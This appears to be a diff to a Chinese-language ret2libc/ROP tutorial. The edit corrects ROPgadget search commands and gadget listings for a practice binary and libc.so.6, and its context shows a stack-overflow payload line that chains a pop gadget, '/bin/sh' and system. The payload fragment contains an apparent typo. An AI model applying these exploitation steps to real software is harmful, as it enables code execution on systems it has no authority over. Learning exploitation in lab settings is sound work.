@@ -83,7 +83,7 @@ ROPgadget 	--binary rop_libc1  --only "pop|ret"
 0x0000000000001293 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 0x0000000000001297 : pop rbp ; pop r14 ; pop r15 ; ret
 0x000000000000116f : pop rbp ; ret
-0x000000000000129b : pop rdi ; ret
+0x000000000000129b : pop rdx ; ret
 0x0000000000001299 : pop rsi ; pop r15 ; ret
 0x0000000000001295 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 0x0000000000001016 : ret
@@ -93,7 +93,7 @@ ROPgadget 	--binary rop_libc1  --only "pop|ret"
 &emsp;&emsp;我们发现结果并不理想，由于这个程序太小了，里面竟然没有 **pop rdi ; ret** 这条指令，那么我们只好换个思路，为什么不直接使用libc.so里的gadgets呢？灵机一动之后，我们想到可用使用write()来泄漏libc.so里的指令地址，话不多说，先搜一下symbols地址：  
 
 ```shell
-ROPgadget --binary rop_libc --only "pop|ret" 
+ROPgadget --binary libc.so.6 --only "pop|ret" 
 =====================================================
 0x000000000002456f : pop rdi ; pop rbp ; ret
 0x0000000000023a5f : pop rdi ; ret
@@ -107,7 +107,7 @@ payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_
 &emsp;&emsp;但同时考虑到我们只需要执行system一次，所以似乎gadgets不含有ret也可以，那么我们的选择又多了一些：  
 
 ```shell  
-ROPgadget --binary rop_libc --only "pop|call"
+ROPgadget --binary libc.so.6 --only "pop|call"
 ====================================================
 0x00000000000bad0d : call qword ptr [rdi]
 0x0000000000027225 : call rdi
